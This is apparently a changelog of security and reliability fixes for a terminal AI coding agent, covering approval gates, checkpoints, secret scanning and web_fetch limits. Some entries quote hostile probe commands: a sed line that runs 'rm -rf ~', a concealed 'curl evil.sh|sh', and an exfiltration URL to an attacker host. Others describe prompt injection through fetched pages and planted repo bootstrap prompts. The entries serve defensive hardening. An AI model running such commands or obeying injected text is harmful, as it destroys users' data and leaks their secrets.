    Yes/No prompt.
    Unlike leave-bash/cancel/copy, "don't quit" is never a destructive
    default, so `_on_escape` now gives `"Quit Aurora?"` the same bare-Esc-
    cancels exemption `"Select model"` already had — resolved through
    `_resolve_menu` (this menu was opened via `_open_ui_menu`'s callback
    style, not the answers queue "Select model" uses) so draft-restore and
    menu-teardown bookkeeping stay identical to an explicit "No, stay"
    pick.

    **Test:** `test_third_esc_cancels_the_quit_menu_it_just_opened`.

32. **R262 — `/auto-approve on|off` skips the approval prompt for the
    session.** Feature request: on a long tool-heavy turn, approving one
    gated call after another gets tiring. `/auto-approve on` makes every
    call that would normally stop and ask run unprompted instead — same as
    picking "Yes" at every gate yourself — logged under its own
    `auto_approved` decision (a new `AgentCallbacks.auto_approve` callable,
    polled fresh per gated call, not a snapshot at turn start, so toggling
    mid-turn takes effect on the very next call) so the session log still
    shows WHY nobody was asked, distinct from an ordinary allowlist hit.
    Two things it deliberately does NOT bypass: a `/denylist` rule still
    blocks its call outright (checked and `continue`d past, unconditionally
    of auto-approve, same "deny always wins" design as R120), and a
    detected secret still stops and asks separately (`secret_challenge` is
    an unrelated gate).
    Session-only, NOT persisted to `runtime.yaml` — unlike `/fallback` and
    `/multiline`, a standing config-file bypass of the approval gate is a
    much bigger foot-gun than a toggle that always starts back off on a
    fresh run. While it's on, the TUI status bar carries a persistent `⚠
    auto-approve ON` tag — the whole point of the session-only default is
    that this is meant to be a temporary "stop nagging me for this task"
    switch, not a standing preference, and a toggle with no visible
    reminder is exactly how it gets left on into an unrelated, riskier
    request.

    **Test:** `test_auto_approve_skips_the_prompt_and_logs_its_own_decision`,
    `test_auto_approve_never_overrides_a_denylist_rule`,
    `test_auto_approve_command_toggles_and_reports_status`,
    `test_auto_approve_is_session_only_not_persisted`,
    `test_status_bar_warns_while_auto_approve_is_on`.

33. **R263 — `/export [id]` exports a PAST session directly by id/prefix, no
    `/resume` needed first.** Feature request: session ids are random hex
    (`uuid4().hex[:12]`, no timestamp component), so finding an old one meant
    `/resume`-ing it into the live engine just to then `/export` it —
    mutating the active session state for a read-only operation.
    `sessions.export_markdown(session_id)` already read straight from a
    session's on-disk JSONL log by id, independent of any live `Engine`; only
    `/export`'s own arg-parsing was missing, hardcoded to
    `engine.session.id`. New `session.resolve_session_id(prefix)`: an exact
    id match always wins outright (even where it also happens to prefix a
    different id); otherwise exactly one hex-prefix match resolves silently,
    and zero or multiple matches both raise `ValueError` with the candidate
    list, so `/export` surfaces that message as-is rather than guessing. No
    arg still exports the current session, unchanged.

    **Test:** `test_resolve_session_id_exact_and_unique_prefix`,
    `test_resolve_session_id_ambiguous_and_missing`,
    `test_export_command_accepts_a_past_session_id`.

34. **R264 — a bare Esc fires promptly, even with Alt-chord bindings.** The
    TUI binds `escape+enter`, `escape+m` and `escape+end`, which makes a lone
    Esc a key-sequence PREFIX: prompt_toolkit's KeyProcessor then holds it for
    `Application.timeoutlen` (default 1.0s) before firing the plain `escape`
    binding. Only `ttimeoutlen` (the byte-level VT100 wait) had been lowered,
    so every double-Esc gesture's second tap fired ~1.0s late (measured
    1.003s) and the first fired only when the second key arrived.
    `timeoutlen` is now 0.05s. An Alt chord arrives from the terminal as one
    burst, so it still completes.

    **Test:** `test_each_esc_of_a_double_tap_fires_promptly` (real
    Application over a pipe; fails at +1.0s with the old timeout),
    `test_alt_enter_still_submits_in_multiline_with_short_timeout`.

35. **R265 — a secret "stop" on a write argument closes the turn validly.**
   `agent.run_turn`'s write-argument scan (write_file/edit_file/apply_patch)
   returned on "stop" without recording anything, unlike the reply-scan stop
   (P-1). On a first round that left history ending on the user message, so
   the next send stacked two user turns, and the requested calls never
   reached `on_tool_result`. It now reports each call as skipped, drops the
   tool calls, and appends a tool-call-free assistant message (a placeholder
   when the reply had no text). The secret never enters history.

   **Test:** `tests/test_deepdive_regressions.py::test_write_arg_secret_stop_leaves_a_closed_valid_history`.

36. **R266 — "did the turn produce anything" is a flag, not a length check.**
   `Engine.send` and `_run_turn_with_fallback` inferred progress from
   `len(self.messages) > before`. A mid-turn auto-compact (R154) shrinks
   that list in place, so a long productive turn read as "produced nothing":
   its `assistant` record (tokens, billed_input, latency) was never logged,
   so `/cost` and the resume cost seed lost the spend, and with
   `model_fallback` on the turn was re-run on another model after its tools
   had already executed. `agent.Turn.produced` is set at every point an
   assistant message is appended; the length check remains only as a
   fallback for callers that return a bare turn object.

   **Test:** `tests/test_deepdive_regressions.py::test_turn_that_folds_mid_turn_is_still_logged_as_produced`.

37. **R267 — a fallback turn is attributed to the model that answered.** `send()`
   bound `model` before `_run_turn_with_fallback`; when R162 fell back to
   another model, the `assistant` record still named the original, failed
   model. `usage_by_model`, `/context`, the resume cost seed and
   `last_latency_by_model` then priced and credited the tokens to the wrong
   model. The record now reads `self.current` after the turn.

   **Test:** `tests/test_deepdive_regressions.py::test_fallback_turn_is_attributed_to_the_answering_model`.

38. **R268 — tool arguments must be a JSON object.** `openai_compat.turn` only
   checked that a tool call's arguments parsed as JSON. A list, string,
   number or `null` became `ToolCall.arguments` and raised `AttributeError`
   in the agent loop AFTER the assistant `tool_calls` message was appended,
   so history kept an orphaned tool_call that every later request sent (and
   `Engine.send` only cleans up a dangling USER message). A non-object now
   raises `MalformedToolCall` and takes R5's retry-then-degrade path.

   **Test:** `test_non_object_tool_arguments_raise_malformed` (list/string/
   number/null), `test_run_turn_degrades_instead_of_orphaning_a_tool_call`.

39. **R269 — model edits keep a file's line endings.** `edit_file` and
   `apply_patch` read with `read_text` (universal newlines) and wrote in text
   mode, so one edit rewrote every CRLF in a Windows-style file as LF: a
   whole-file diff and a silent line-ending change. A uniformly-CRLF file is
   now edited in LF form (so a model's LF-joined `old` and hunks still
   match) and written back as CRLF. Any other file (LF or mixed) is read and
   written byte-faithfully: `paths.write_text_preserving` writes with
   `newline=""`.

   **Test:** `test_edit_file_keeps_crlf_line_endings`,
   `test_apply_patch_keeps_crlf_line_endings`,
   `test_edit_file_leaves_lf_and_mixed_files_byte_faithful`.

40. **R270 — `edit_file` refuses an empty `old`.** `text.count("")` is
   `len(text) + 1`, so `replace_all=true` with `old=""` inserted `new`
   between every character of the file (`abc` → `XaXbXcX`). It now returns
   an `[error: ...]` pointing at `write_file`, and the file is untouched.

   **Test:** `test_edit_file_rejects_empty_old` (with and without replace_all).

41. **R271 — model-run commands never inherit the terminal's stdin.**
   `_run_command_once` and `_start_background` spawned with no `stdin`, so
   a command inherited the TUI's own terminal, which prompt_toolkit holds in
   raw mode. Anything that reads stdin (a REPL, a y/N prompt, `git commit`
   without `-m`, `head`) fought the TUI for keystrokes or blocked until
   COMMAND_TIMEOUT (300s). Both now use `stdin=DEVNULL`: EOF is the honest
   answer, since nobody can type there.

   **Test:** `test_a_stdin_reading_command_gets_eof_not_a_hang`,
   `test_background_job_stdin_is_not_inherited` (fd 0 swapped for an open,
   silent pipe; pytest's own fd 0 hides the bug).

42. **R272 — Esc-Esc cancels a running foreground command.** A
   `run_command`/`wait_until` blocked the turn with no cancel hook until the
   command exited or hit its timeout (300s), while an API request was
   cancellable within 0.15s. `tools.run_tool(..., cancel=)` now hands the
   turn's `cb.cancelled` to those two builtins. `_run_command_once` polls it
   every 0.15s and, when it fires, kills the whole process group and returns
   the partial output plus a `[cancelled by user …]` marker, and
   `wait_until`'s between-attempt sleep is interruptible. The side
   channel's `!` commands pass no cancel callback, so their behaviour is
   unchanged.

   **Test:** `test_run_command_honours_cancel_and_kills_the_group` (a
   backgrounded grandchild dies too), `test_wait_until_honours_cancel_between_attempts`,
   `test_side_channel_runner_without_cancel_is_unchanged`. Four existing
   `run_tool` fakes updated for the new keyword.

43. **R273 — a gated call with no target path invalidates the per-file undo
   snapshot.** `rewind.clear_last_mutation()` existed so that "the last
   mutation" could not outlive a later, differently-shaped one, but nothing
   called it. The engine's checkpoint callback only ever took a snapshot
   (when args had `path`). After `edit_file(A)` followed by any
   `run_command`, `/undo` still offered, and reverted, A's older edit while
   the real last change was ignored. That is the exact "undo reverted the
   wrong thing" incident `undo_preview` documents. A pathless gated call
   (`run_command`, `wait_until`, `cancel_command`, `mcp_*`) now clears the
   snapshot.

   **Test:** `test_undo_never_reverts_an_older_edit_after_a_command`.

44. **R274 — nested git repos are never claimed as checkpointed, and never
   disable checkpoints.** `git add -A` records a repository nested below the
   checkpoint root (a sub-repo when Aurora runs from `~/repositories` or `~`,
   a submodule, a vendored checkout) as a gitlink, a commit pointer rather
   than its files, so `/rewind` cannot restore anything inside it. Yet
   `covers()` returned True, so the approval prompt's "cannot undo" note
   never appeared. `covers()` now returns False for any path under a nested
   `.git`. Found while testing it: an embedded repo with NO commit makes
   `git add -A` abort entirely, and `checkpoint()` swallowed that, so one
   fresh `git init` below cwd silently meant no checkpoints for the whole
   project. Every shadow-repo `add -A` now runs with `--ignore-errors`.

   **Test:** `test_covers_is_false_inside_a_nested_repo` (also asserts the
   gitlink reality), `test_covers_still_true_in_the_project_repo_itself`,
   `test_a_commitless_nested_repo_does_not_disable_checkpoints`.

45. **R275 — a checkpoint is bounded by what changed, not by how big it is.**
   `checkpoint()` runs `git add -A` synchronously before every approved
   call, and git hashes and compresses each new or changed file in full.
   Measured: a single 800MB file blocked the first approval for 16.9s and
   copied 801MB into `AURORA_HOME/checkpoints`, and past the 60s `_git`
   timeout the checkpoint silently did not exist. Before each add, every
   new-or-modified file over `MAX_CHECKPOINT_FILE_BYTES` (50MB) is written
   into the shadow repo's `info/exclude`. It is listed via `git ls-files -o
   -m`, so the cost is a stat per changed file, and names are escaped so
   glob characters match literally. A cwd that is `$HOME` or the filesystem
   root gets no checkpoints at all, and `covers()` returns False there so
   the approval prompt says so. Tracked files committed before this change
   are not retroactively excluded.

   **Test:** `test_checkpoint_leaves_out_files_over_the_cap`,
   `test_checkpoint_is_bounded_by_changed_file_count_not_bytes` (200MB sparse
   file, <3s), `test_no_checkpoint_and_honest_covers_for_home`.

46. **R276 — a session's rotated parts 10+ are parts, not new sessions.**
   `_ROTATED_RE` was `\.([2-9][0-9]*)\.jsonl$`, which needs the first digit
   to be 2-9, so `<id>.10.jsonl` through `.19`, `.100`–`.199`, … were read
   as a separate base session named `<id>.10`. After ~45MB (9 parts) a long
   session grew phantom entries in `/sessions`, `/resume` and `/search`,
   and `usage_all_sessions` (`/cost`) counted those parts twice. It now
   accepts any part number ≥ 2 without a leading zero.

   **Test:** `test_rotated_parts_past_nine_are_not_phantom_sessions` (12+
   parts: one session, 40 turns counted once).

47. **R277 — "always allow" never generalizes over a command's payload.** The
   two-token rule stores the command plus its first argument. For these
   commands that first argument is the harmless half and the payload
   varies freely. Verified before the fix, each probe auto-approved with no
   prompt: `sed -i s/a/b/ f` stored `sed -i` and then approved
   `sed -i '1e rm -rf ~' ~/.bashrc` (GNU sed's `e` runs a command);
   `git -c color.ui=false status` stored `git -c` and then approved
   `git -c core.sshCommand=… fetch`; also `tar -xf evil.tar -C /`,
   `rsync -a --delete / x` and `uv run evil.py`. `DANGEROUS_COMMANDS` gains
   editors/stream processors (sed, awk, ex, vim, ed), archivers/copiers
   (tar, unzip, rsync, scp, sftp, ssh), runners (uv, uvx, pipx, poetry,
   pdm, hatch, conda, go, deno, bun, php, lua, java, Rscript, xargs, env,
   nohup, timeout, nice, watch, crontab, at) and killers (kill, pkill,
   killall), which makes their rules exact-match only. `git` keeps prefix
   generalization unless a token is `-c`/`--config-env`/`--exec-path`.

   **Test:** `test_always_allow_does_not_generalize_payload_commands` (10
   approved/probe pairs), `test_plain_git_subcommands_still_generalize`.

48. **R278 — R58 detects OpenRouter keys and `export`ed credentials.**
   OpenRouter is Aurora's own remote provider, and its keys
   (`sk-or-v1-<64 hex>`) matched no pattern. The OpenAI shape stops at the
   hyphen after `sk-or`, and the entropy fallback skips all-lower-case hex.
   Verified: `scan()` returned nothing for a JSON `"api_key"`, a YAML
   `key:` and `export OPENROUTER_API_KEY=…`. That last case also showed the
   `.env` rule was anchored at the line start, so any `export X_TOKEN=…`
   line (every .bashrc/.zshrc/.envrc credential) was missed. A dedicated
   `OpenRouter key` shape (with its literal guard) and an optional
   `export ` prefix on the env rule close both. Ordinary exports
   (`PATH`, `EDITOR`) still don't match.

   **Test:** `test_openrouter_keys_and_export_lines_are_detected` (5 shapes),
   `test_export_detection_does_not_flag_ordinary_exports`; the R96g guard
   superset test gained an OpenRouter sample.

49. **R279 — side-channel output never merges into, or closes, the running
   turn.** R254c/d fixed this only for quick_ask. Side-safe `/commands`
   (`/status`, `/cost`, `/context`, `/diff`, …) print through the global
   `_ChatWriter`, which called `append()`. That merged their lines into the
   turn's streaming entry and closed the turn's live think row, so its next
   reasoning chunk opened a second row with a restarted clock. A side `!`
   command's `append_bash_output` also closed that row. And `_ChatWriter`'s
   single buffer was shared by both workers, so one thread's print could
   flush the other's partial line. Now: the buffer is thread-local, a flush
   from the side worker (marked by `_prompt_nowait`) goes to `append_side`,
   and side bash output leaves the think row alone.

   **Test:** `test_side_command_print_is_its_own_entry_and_keeps_think_open`,
   `test_side_bash_output_keeps_the_turns_think_row_open`,
   `test_chat_writer_buffers_are_per_thread`.

50. **R280 — every shadow-repo index operation holds the repo lock.** R191 put
   `checkpoint()` and `prune()` under `_repo_lock`, but `diff_since`,
   `undo_preview`, `undo_diff`, `undo`'s reset and `restore`'s
   reset/clean/tag ran unlocked. `/diff` is side-safe (R253), so it runs
   concurrently with the worker's `checkpoint()`. Two `git add -A`s on one
   index collide on `index.lock`, and `checkpoint()` swallows the failure:
   an approved mutation then ran with no checkpoint (R191's lost-checkpoint
   class again). Measured before the fix: the race test lost checkpoints on
   every run. The lock is taken per operation, never nested, since
   `undo` → `undo_preview` and `restore` → `checkpoint` each lock
   separately.

   **Test:** `test_concurrent_diff_never_loses_a_checkpoint` (3 threads of
   diff/undo_preview against 25 checkpoints; 0 lost).

51. **R281 — an `apply_patch` hunk anchors on whole lines only.**
   `patch.apply` located a hunk's context+removed lines with a raw substring
   count and `str.replace`. A hunk could anchor in the middle of an
   unrelated line and edit it while reporting success, and a whole-line
   match could be rejected as "matches 2 times" because of a substring
   elsewhere. Verified: `-count = 5 / +count = 6` turned `total_count = 5`
   into `total_count = 6`. A match now counts only if it starts at a line
   start and ends at a line end. The approval preview uses the same
   function, so preview and result still agree.

   **Test:** `test_patch_never_anchors_inside_a_line` (3 cases, including a
   multi-line match straddling line ends),
   `test_patch_counts_only_whole_line_matches_for_uniqueness`.

52. **R282 — `web_fetch` strips script/style blocks in linear time.** The
   strip was `re.sub(r"<(script|style)[\s\S]*?</\1>", …)`. On an opener with
   no closer the lazy scan runs to the end of the text, and it is retried
   from every later opener, which is quadratic. Measured: 224KB of unclosed
   `<script` took 33.7s, and the fetch cap is 2MB, on an ungated,
   PARALLEL_SAFE tool that Esc could not interrupt. `_strip_script_style`
   is one forward pass: every search starts where the last one ended. An
   unclosed block swallows the rest of the page, as a browser would. Proper
   pairs strip exactly as before, case-insensitive, `</script >` included.

   **Test:** `test_script_strip_is_linear_on_unclosed_tags` (2.1MB, <1s),
   `test_web_fetch_end_to_end_is_fast_on_hostile_html` (35.5s → failing
   before the fix), `test_script_strip_matches_the_old_behaviour`.

53. **R283 — `web_fetch` asks before reaching a private host or sending a query
   string.** `web_fetch` and `read_file` were both ungated, so injected text
   in a fetched page could chain `read_file(<private file>)` →
   `web_fetch("https://attacker/?d=<contents>")`, or read an internal
   service (a LAN admin UI, `127.0.0.1:9512`, `169.254.169.254`), with no
   prompt at all. `tools.needs_approval(name, args)` now gates a fetch whose
   URL targets a non-public host (loopback, private, link-local, reserved,
   `localhost`/`.local`/`.ts.net`/`.internal`/`.lan`/`.home`, or a name
   resolving to one of those), carries a query string, or isn't http(s). A
   plain public page still runs with no prompt. A gated fetch is never
   prefetched by the R94 parallel batch. Redirects are followed manually,
   one hop at a time, and a public URL redirecting to a private host is
   blocked. "Always allow" stores the origin (`scheme://host:port/*`) and
   matches it exactly, never a bare `*`. The approval prompt shows the URL
   and why it asked. The mutation checkpoint still asks by name alone, so a
   fetch takes no checkpoint.

   **Test:** `test_url_needs_approval_policy` (10 URLs),
   `test_private_fetch_is_gated_and_never_prefetched`,
   `test_redirect_from_public_to_private_is_blocked`,
   `test_always_allow_web_fetch_is_scoped_to_one_origin`.

54. **R284 — `/commit`'s draft request passes the R58 secret gate.** The
   staged diff (up to `_DRAFT_DIFF_CAP`, 20KB) went to the provider through
   `side_completion` with no scan, while every other path that sends new
   content to the model scans first (prompt, tool output, quick_ask per
   R254g). Staging a `.env` and running `/commit` sent its token
   unchallenged. The diff is now scanned exactly as it would be sent.
   "stop" drafts nothing (the user types the message), "redact" sends the
   redacted diff, "keep"/"always" behave as everywhere else.

   **Test:** `test_commit_draft_is_secret_scanned` (stop/redact/keep).

55. **R285 — `/commit` reads git output as UTF-8 with replacement.**
   `gitcommit._git` used `text=True`, i.e. the strict locale codec. A staged
   latin-1 file (or any non-ASCII under `LANG=C`) raised
   `UnicodeDecodeError` out of the unguarded `staged_diff`/`unstaged_summary`
   and killed `/commit` with a raw exception. Now `encoding="utf-8",
   errors="replace"`.

   **Test:** `test_commit_handles_a_non_utf8_staged_diff`.

56. **R286 — a project bootstrap prompt must be trusted before it runs.** A
   `.aurora/bootstrap.md` in cwd overrides the global prompt and was offered
   at startup with Enter = yes, after showing only a 70-character first
   line, as a tool-enabled first turn. Cloning someone else's repo and
   pressing Enter ran their instructions, and existing allowlist rules or
   `/auto-approve` then executed them unprompted. `_run_bootstrap`, which
   every path uses (startup, `/reset`'s re-run, `/bootstrap run`), now
   shows an untrusted project prompt in full (up to 4000 chars) and asks
   with default NO. Approval is recorded per machine as path → SHA-256 in
   `AURORA_HOME/trusted_bootstraps.json`, so an edited prompt asks again.
   The global prompt is the user's own and needs no record.

   **Test:** `test_untrusted_project_bootstrap_defaults_to_not_running`,
   `test_trusted_project_bootstrap_runs_until_its_content_changes`,
   `test_global_bootstrap_needs_no_trust_record`.

57. **R287 — nothing shown at the approval gate can hide part of itself.** The
   approval prompt printed model-authored commands, `then:` follow-ups,
   paths, URLs, MCP arguments and the diff preview with their raw control
   sequences. `strip_dangerous_escapes` removes only OSC/DCS/APC/PM/SOS and
   keeps SGR for colour. Verified in the TUI render path: `ls -la\x1b[8m;
   curl evil.sh|sh` showed as `$ ls -la`, because SGR 8 conceals the rest,
   so the user approved something other than what ran. `colors.visible()`
   now renders every C0/C1 control, DEL and Unicode bidi/zero-width
   character as a literal `\x1b`/`‮` escape. Newlines, tabs and
   ordinary Unicode text are untouched. It is applied to everything the
   approval prompt prints (the diff before Aurora's own colouring) and to
   the tool-start argument echo.

   **Test:** `test_approval_prompt_shows_control_chars_literally` (SGR-8
   command, `then:`, RLO filename, MCP arg), `test_diff_preview_cannot_hide_added_lines`,
   `test_visible_keeps_newlines_tabs_and_unicode_text`.

58. **R288 — narration before a tool call prints before the tool block.** With
   markdown rendering on (the default, in both front ends), `on_text` holds
   an unterminated last line in `_mdbuf` until a newline arrives. Nothing
   flushed it before other output, and models usually narrate without a
   trailing newline right before a tool call. Verified: "Let me read the
   file." printed AFTER the tool block, glued to the next round's text
   ("…file.It has 3 lines."). `on_tool_start`, `on_tool_result` and `notify`
   now emit the pending partial line (rendered, newline-terminated) first.

   **Test:** `test_partial_line_is_flushed_before_other_output` (tool call
   and notice).

59. **R289 — a TUI frame costs O(visible rows), not O(scrollback).** The chat
   pane used prompt_toolkit's `FormattedTextControl`, whose `create_content`
   splits the WHOLE fragment list into lines and hashes every fragment on
   every call, about 2.6 times per frame counting `preferred_height`.
   Measured on a real running Application, one streamed chunk per frame:
   6.3ms at 1k lines, 17.9ms at 5k, 62.8ms (p90 79ms) at 9.6k, just under
   the 10k cap. That is ~15fps, paid by every keystroke, Esc, mouse move
   and 0.5s tick on the UI thread. `Tui._render_lines` now keeps the
   transcript as a line list maintained incrementally: `_rebuild_locked`
   records the first line its truncation or append can affect, and only
   lines from there on are re-split. `_ChatControl.create_content` returns
   a `UIContent` whose `get_line` materialises a line on demand, applying
   the bottom-anchor padding and the selection overlay per line. Click
   dispatch reads the same cache. After: 6.8ms / 6.7ms / 7.6ms at
   1k / 5k / 9.6k lines.

   **Test:** `test_line_cache_matches_a_full_split_under_random_edits`
   (1500 random appends/think rows/bash output/clears/evictions, checked
   against `split_lines` every 7 steps), `test_chat_frame_cost_is_flat_in_scrollback`
   (<10ms at ~9.6k lines; 20ms before), `test_click_on_a_think_header_still_toggles_it`.

60. **R290 — a dead endpoint is backed off, not re-probed before every
   round.** `pick_endpoint` re-probed the `base_url` list in order whenever
   its 10s cache expired, and `turn()` calls it once per agent round, so
   rounds more than 10s apart re-probed almost every time. With the FIRST
   endpoint dead (off-LAN, or Tailscale down; the shipped `local` provider
   lists ts.net first), each re-probe waited out that endpoint's connect
   budget. Measured: 6.5s per probe (the 2s probe × the transport's
   retries), against 2ms for a healthy one. A 10-round turn could spend
   ~65s probing. A probe failure now keeps that URL out of rotation for
   `_DEAD_URL_BACKOFF_S` (120s) while another URL is a candidate. If every
   URL is marked dead, all are still tried. A successful probe clears the
   mark.

   **Test:** `test_dead_first_endpoint_is_backed_off` (6 rounds → the dead
   URL probed once), `test_backed_off_endpoint_is_retried_after_the_window`,
   `test_all_endpoints_dead_still_tries_them`.

61. **R291 — history over the auto-compact threshold is folded before a turn's
   FIRST request.** The folds ran mid-turn from round 2 on (R154) and at the
   end of a turn (R118). Nothing checked before round 1, so when
   `--continue`, `--resume` or `/resume` restored an oversized log, the
   first request went out over the window. Measured: a 46MB session
   restored as 5000 messages ≈ 1.04M estimated tokens. The request was
   rejected (or, on a large-context remote model, billed in full) before
   any fold could run. `Engine.send` now runs `_maybe_auto_compact` before
   appending the user message, where history still ends on an assistant
   message. Below the threshold it's a no-op.

   **Test:** `test_resumed_history_is_folded_before_the_first_request`
   (400 restored messages → the first real request carries fewer).

62. **R292 — `find_files` is bounded in time and cancellable.** Unlike `grep`
   (GREP_TIMEOUT), it walked with no limit. Measured: 19.7s over 812k
   entries under `~`, unbounded on a larger tree or a network mount, on the
   worker thread, and Esc could not stop it. It now stops at `FIND_TIMEOUT`
   (30s) or when the turn's cancel fires (it joined `run_tool`'s cancellable
   set), checked once per directory, and returns the partial results with a
   `[search … — results are PARTIAL]` marker.

   **Test:** `test_find_files_stops_at_its_deadline`,
   `test_find_files_honours_cancel`, `test_find_files_normal_result_unchanged`.

63. **R293 — finished background jobs are pruned.** `_BG_JOBS` never
   dropped an entry. Each finished job kept up to 10MB of captured output
   (`COMMAND_OUTPUT_CAP` × 2) for the life of the process, and
   `MAX_BACKGROUND_JOBS` only limited RUNNING jobs. Starting a job now drops
   the oldest finished ones beyond `MAX_FINISHED_JOBS` (8). A running job is
   never dropped.

   **Test:** `test_finished_background_jobs_are_pruned`.

64. **R294 — sizing the input box costs O(its 8-row cap), not O(the draft).**
   `_input_height` word-wrapped EVERY line of the draft with `textwrap` on
   every frame, about twice per frame, to compute a height capped at 8
   rows. Measured on a real Application with a 100KB pasted draft: 15.4ms
   redraw median (vs 2.2ms at 1KB), paid by every keystroke. It now stops
   once 8 rows are counted: 2.6ms at 100KB.

   **Test:** `tests/test_ux_perf_regressions.py::test_input_height_does_not_wrap_the_whole_draft`
   (5000-line draft: ≤8 wraps), `test_input_height_still_counts_short_drafts`.

65. **R295 — an idle-unloaded local server reports "asleep", not a schema
   alarm.** m7's llama-server idle manager (and any gateway in front of it)
   answers `/props` with `{"sleeping": true, "model_path": null}` while the
   model is unloaded. The startup banner and `/status` read that as a
   broken backend: "✔ ? ready, ctx unknown — /props schema changed?
   (llama.cpp upgrade)", on every cold start. It now reports healthy and
   "asleep — the model loads on the first request (expect a slower first
   reply)", which is what actually happens. An awake server's line is
   unchanged.

   **Test:** `test_sleeping_server_reports_asleep_not_schema_change`,
   `test_awake_server_still_reports_model_and_ctx`.

66. **R296 — the checkpoint size cap persists, and costs one cheap scan.** Two
   defects in R275, found by measuring it:
   - **It only worked once.** The exclude list was rebuilt from what git
     listed, and an already-excluded file is no longer listed, so the second
     checkpoint dropped it from the list and `add -A` snapshotted it anyway.
     Verified: `big.bin` absent at checkpoint 0 and present at 1 and 2.
     Excluded paths are now remembered in `info/aurora-large` and
     re-checked, so a file that shrinks below the cap is snapshotted again.
     A tracked file that grows past it is dropped from the index once,
     since excludes never apply to tracked paths.
   - **It doubled the per-approval cost.** `ls-files -o -m` took 93ms on a
     50k-file tree, more than the `add -A` (40ms) it guarded.
     `status --porcelain -uall --no-renames` gives the same answer in ~35ms.
     Measured per approval on that tree: 180ms → ~130ms.

   **Test:** `test_big_file_stays_excluded_across_checkpoints`,
   `test_a_file_that_shrinks_is_snapshotted_again`,
   `test_an_already_tracked_file_that_grows_is_dropped`,
   `test_one_status_scan_per_checkpoint`.

67. **R297 — the `/model` picker warns about a model that will fail if
   picked, instead of only finding out mid-turn.** A config entry can name an
   Ollama model that was never `ollama pull`ed (or was later removed) — real
   case caught live: `qwen2.5:3b` was configured but not installed on the
   local Ollama server, while `qwen3:1.7b` right above it in the same picker
   was. Same failure shape for any local/LAN backend (llama.cpp `local`
   entry, or an Ollama host) that's simply unreachable — nothing in the
   picker distinguished "this will work" from "this will fail" before now.

   `Provider.model_health(model)` (`providers/base.py`) returns
   `{"ok": bool, "detail": str}` or `None` (nothing worth checking — the
   default, and what a remote paid API like OpenRouter gets: a bad model id
   there only surfaces as a 4xx on first use, and probing every entry would
   cost a real billed request per row on every picker open).
   `OpenAICompatProvider.model_health` (`providers/openai_compat.py`)
   implements it for local/LAN backends: reachability via the existing
   `_probe`, and for Ollama specifically, existence via `/api/tags` (not
   `/api/show` — that 404s identically for "server unreachable" and "model
   not installed", which would mislabel a live server's missing model as a
   connectivity problem).

   `/model` (`ui.py:_pick_model`) probes every checkable entry (in parallel,
   one thread per entry) BEFORE the menu is built, bounded to a 2.5s total
   deadline — not the price refresh's pure fire-and-forget-then-relabel
   shape, because `TerminalFrontend.update_menu_labels` (`ui.py`) is a
   documented no-op on the classic (non-TUI) frontend: "the classic REPL's
   select() already PRINTED its numbered list." A relabel-only warning would
   never reach a classic-mode user at all, and even in the TUI a fast Enter
   could beat it — so the bounded wait runs first, and only a probe still
   unresolved past the deadline falls back to a background relabel (TUI
   only, same shape R80's price refresh uses). Appends a red `⚠ <detail>`
   (e.g. `⚠ not pulled`, `⚠ unreachable`) after any entry that comes back
   `ok: False`.

   **Test:** `test_model_health_ollama_model_not_pulled`,
   `test_model_health_ollama_unreachable`,
   `test_model_health_local_llamacpp_reachable_and_unreachable`,
   `test_model_health_remote_paid_api_returns_none`,
   `test_pick_model_shows_health_warning_before_first_render`,
   `test_pick_model_slow_probe_does_not_block_past_deadline`.

68. **R298–R306 — fixes from the 2026-09-28 audit card.** R298: `tree -o/--output[=]`
   and `file -C` are unsafe flags, so a SAFE_COMMANDS rule can't approve them.
   R299: `wait_until` with a `then` command is never auto-approved, and `then`
   is checked against the denylist. R300: `web_fetch` also asks before sending
   data-like path segments, long host labels or very long URLs, and the check
   before asking does no DNS lookup. R301: only a URL that is itself private
   may redirect to a private host; the prefetch and the gate both apply URL
   deny rules to ungated fetches; a connect to a private peer that nobody
   approved (DNS rebinding) is refused. R302: batched parallel calls get the
   turn's cancel. R303: the prompt shows `cwd` and `background`, and a command
   whose `cwd` is outside the working directory always prompts. R304: the key
   store refuses an empty passphrase and asks for a new one twice. R305: an
   MCP tool name that two servers both produce is dropped from specs AND
   runners, with an error listed. R306: `visible()` escapes every Cc/Cf/Zl/Zp
   character, variation selectors and Hangul fillers. Also: `build/` is no
   longer tracked, because a stale R157 copy was shipping on non-editable
   installs.

   **Test:** `tests/test_aurora_audit_fixes.py`.
